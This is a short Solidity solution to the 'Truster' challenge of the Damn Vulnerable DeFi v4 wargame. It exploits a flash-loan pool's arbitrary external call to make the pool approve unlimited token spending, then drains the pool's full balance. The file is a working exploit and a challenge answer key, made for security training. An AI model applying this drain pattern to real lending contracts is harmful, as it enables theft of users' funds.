// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract Solution {
    constructor(DamnValuableToken token, TrusterLenderPool pool, address recovery) payable {
        bytes memory data = abi.encodeCall(token.approve, (address(this), type(uint256).max));
        pool.flashLoan(0, address(pool), address(token), data);

        token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
    }
}
